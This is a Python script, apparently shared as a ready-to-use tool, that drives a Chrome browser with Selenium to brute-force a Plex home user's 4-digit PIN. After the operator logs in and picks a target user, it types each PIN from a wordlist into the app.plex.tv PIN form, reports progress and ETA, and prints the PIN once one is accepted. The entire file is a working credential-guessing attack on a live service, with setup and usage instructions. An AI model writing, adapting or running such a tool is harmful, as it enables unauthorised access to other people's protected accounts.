"""
    BRUTE FORCE PLEX PIN V2 (BFPPv2.py)
    Using selenium web browser and python to bruteforce the plex server home user plex pin code.!

Requirements:
    Install python3 and use pip to install libraries needed.
    Pip should be installed automatically with python3 : https://www.python.org/downloads/

    Commands to run:
        >> pip install -r requirements.txt
        >> python BFPPv2.py

    Also make sure you have the latest chromedriver, found here https://chromedriver.chromium.org/downloads
    Place the exe in the same folder as 'BFPPv2.py'
    Also make sure your chrome is up to date: chrome://settings/safetyCheck -> check now (update)

Usage:
    Launch the program!
    Login to your Plex server home user..
    Select the user you want to bruteforce..
    Begin..
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import ElementNotInteractableException

import argparse
from time import time, sleep
from datetime import timedelta

def msg(string):
    print('  >> ' + string)

def load_pin_list(pinfile):
    with open(file=pinfile, mode='r') as f:
        pins = f.readlines()
    return pins

def main(pinfile, sleep_after_keys_send, ):
    # Load 4 digit pin numbers from file.
    pin_list = load_pin_list(pinfile=pinfile)

    # Configure webdriver.
    options = webdriver.ChromeOptions()
    options.add_argument('--incognito')
    options.add_argument('--disable-extensions')

    with webdriver.Chrome('./chromedriver.exe', options=options) as driver:
        # Open plex login page.
        driver.get('https://app.plex.tv/desktop#!/login')
        wait = WebDriverWait(driver, 300)

        # Login to a home user.
        msg('You have 5 minutes(300s) to login.')
        element = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'user-select-list-item')))
        msg('Login success!')

        # Select a home user as a target.
        msg('You have 5 minutes(300s) to select a user(target).')
        element = wait.until(EC.presence_of_element_located((By.ID, 'pin-form')))
        element = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'username')))
        msg('User "' + element.text + '" selected as target.')

        # Starting bruteforce
        element = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'pin-input')))
        msg('Input field located. Starting bruteforce..')

        # Statistics
        time_per_pin = []
        pin_list_len = len(pin_list)

        wait = WebDriverWait(driver, 10) # New wait object with 10 seconds timeout
        # Starting pin attempt loops
        for pin in pin_list:
            t1 = time() # Start timer to calculate ETA
            pin = pin.strip() # Strip the string clean
            previous_pin = pin

            # Check if ready for input
            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'span.loading.loading-sm.hidden')))
            try:
                element.send_keys(pin) # Send digits(pin)
                sleep(sleep_after_keys_send)
            except ElementNotInteractableException as enie:
                try:
                    pin_digit = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'pin-digit')))
                    pin_digit.click()
                    element.send_keys(pin)
                except:
                    print('')
                    msg('We have a match!! PIN = ' + previous_pin)
                    break
            except:
                print('')
                msg('We have a match!! PIN = ' + previous_pin)
                break


            # Construct progress message
            t2 = time()
            time_per_pin.append(t2-t1)
            print(str(len(time_per_pin)) + ' >> Current: ' + pin + ' | K/s: ' + str(len(time_per_pin)/sum(time_per_pin)) + ' | ETA: ' + str(timedelta(seconds=float((sum(time_per_pin)/len(time_per_pin))*(pin_list_len-len(time_per_pin))))), end='\r')
            #print('  {:6} >> Current-pin: {:6} | K/s: {:10} | ETA: {:15}'.format(str(len(time_per_pin)), pin, str(len(time_per_pin)/sum(time_per_pin)), str(timedelta(seconds=float((sum(time_per_pin)/len(time_per_pin))*(pin_list_len-len(time_per_pin)))))) + end='\r')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Awesome code to bruteforce Home user pin!')
    parser.add_argument('-pfile', '--pin_file',
                        default='./pinfile.txt',
                        required=False,
                        help='A file with 4-digit code on each line. Default: ./pinfile.txt')
    parser.add_argument('-pd', '--pin_delay',
                        default=0,
                        required=False,
                        help='Set a delay right after the program has send the current pin. Default: 0.')

    args = parser.parse_args()

    main(pinfile=args.pin_file, sleep_after_keys_send=args.pin_delay)
